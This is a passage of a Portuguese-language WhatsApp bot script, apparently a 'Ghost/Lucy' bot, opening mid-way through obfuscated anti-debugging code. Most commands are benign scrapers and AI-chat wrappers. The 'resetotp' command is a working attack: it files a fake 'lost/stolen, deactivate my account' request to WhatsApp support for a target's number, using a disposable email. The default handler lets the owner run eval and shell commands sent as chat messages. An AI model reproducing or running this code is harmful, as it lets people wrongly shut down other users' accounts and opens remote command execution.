function(A){}['constructo'+'r']('while\x20(tru'+P(0x1b9))[P(0x1c8)](P(0x1b5));else(''+z/z)['length']!==0x1||z%0x14===0x0?function(){return!![];}['constructo'+'r'](P(0x1bc)+P(0x1a8))[P(0x1c7)]('action'):function(){return![];}[P(0x1c9)+'r'](P(0x1bc)+'gger')[P(0x1c8)](P(0x1a2)+'t');v(++z);}try{if(w)return v;else v(0x0);}catch(z){}}
        }
    break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replygcGhost(`${themeemoji} *Facto:* ${data.fact}\n`)   
    }
    break
    case 'ia': case 'openai':
try {
if (global.keyopenai === '') return replygcGhost("Limite de chave de API excedido");
if (!q) return replygcGhost(`Bate-papo com IA\n\nExemplo:\n${prefix + command} o que é codificação`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: q,
temperature: 0.3,
max_tokens: 2000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
replygcGhost(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
replygcGhost("Sorry, there seems to be an error :"+ error.message);
}
}
break
case "iamage":
try {
if (global.keyopenai === '') return replygcGhost("Limite de APIkey excedido");
if (!q) return replygcGhost(`Gerar imagem com IA\n\nExemplo:\n${prefix + command} Lucy`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
Lucy.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
replygcGhost("Desculpe, parece haver um erro :"+ err);
}
break
case 'meuip': {
        if (!GhostTheCreator) return GhostStickOwner()
        if (m.isGroup) return GhostStickPrivate()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcGhost("🔎 Meu endereço IP público é: " + ip)
                    })
                })
            }
        break
            case 'lyrics': {
if (!text) return replygcGhost(`Que letras você está procurando?\nExemplo de uso: ${prefix}lyrics falling`)
GhostStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
replygcGhost(`
*Título :* ${result.title}
*Autor :* ${result.author}
*url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim())
}
break
case 'drive': {
		if (!args[0]) return replygcGhost(`Digite o link do Google Drive`)
	GhostStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcGhost(`
≡ *Google Drive DL*
▢ *Não:* ${res.fileName}
▢ *Tamanho:* ${res.fileSize}
▢ *Tipo:* ${res.mimetype}`)
	Lucy.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcGhost('Erro: verifique o link ou tente outro link') 
  }
}
break
              case 'pinterest': {
              	if (!text) return replygcGhost(`Inserir consulta`)
GhostStickWait()
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
Lucy.sendMessage(m.chat, { image: { url: result }, caption: '⭔ URL da mídia : '+result }, { quoted: m })
}
break
case 'ringtone': {
		if (!text) return replygcGhost(`Exemplo : ${prefix + command} rover preto`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		Lucy.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
	case 'genshin':
if (!text) return replygcGhost(`Qual genshin você está procurando?`)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Nome:* ${anime.name}\n`
txt += `🎖️ *Título:* ${anime.title}\n`
txt += `💠 *Visão:* ${anime.vision}\n`
txt += `🏹 *Arma:* ${anime.weapon}\n`
txt += `💮 *Gênero:* ${anime.gender}\n`
txt += `🌏 *Nação:* ${anime.nation}\n`
txt += `🪷 *Afiliação:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *constelação:* ${anime.constellation}\n`
txt += `📖 *Descrição:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await Lucy.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return replygcGhost('Error')
}
break

	case 'anime': {
if (!text) return replygcGhost(`Qual anime você está procurando?`)
const malScraper = require('mal-scraper')
GhostStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcGhost(`Não consegui encontrar`)
let animetxt = `
🎀 *Título: ${anime.title}*
🎋 *Tipo: ${anime.type}*
🎐 *Estreou em: ${anime.premiered}*
💠 *Total de episódios: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Gêneros: ${anime.genres}
📍 *Estúdio: ${anime.studios}*
🌟 *Pontuação: ${anime.score}*
💎 *Avaliação: ${anime.rating}*
🏅 *Classificação: ${anime.ranked}*
💫 *Popularidade: ${anime.popularity}*
♦️ *Reboque: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Descrição:* ${anime.synopsis}*`
                await Lucy.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
                /*
                case 'imdb':
if (!text) return replygcGhost(`_Nomeie uma série ou filme`)
GhostStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           Lucy.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
     */       
case "resetotp": {
if (Input) {
let cekno = await Lucy.onWhatsApp(Input)
if (cekno.length == 0) return replygcGhost(`O participante não está mais cadastrado no WhatsApp`)
if (Input == owner + "@s.whatsapp.net") return replygcGhost(`Não consigo sair Meu Proprietário!`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "BRASIL")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replygcGhost(`Success..!`)
} else if (payload.includes(`"payload":false`)) {
replygcGhost(`Limite moderado Aguarde um momento.`)
} else replygcGhost(util.format(res.data))
} catch (err) {replygcGhost(`${err}`)}
} else replygcGhost('Digite o número do alvo!')
}
break

default:

if (budy.startsWith('<')) {
if (!GhostTheCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('vv')) {
if (!GhostTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!GhostTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CONVERSANDO" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('transmissão')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
Lucy.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
Lucy.sendMessage("558181718175@s.whatsapp.net", { text: "Olá desenvolvedor, parece haver um erro, por favor, corrija-o " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
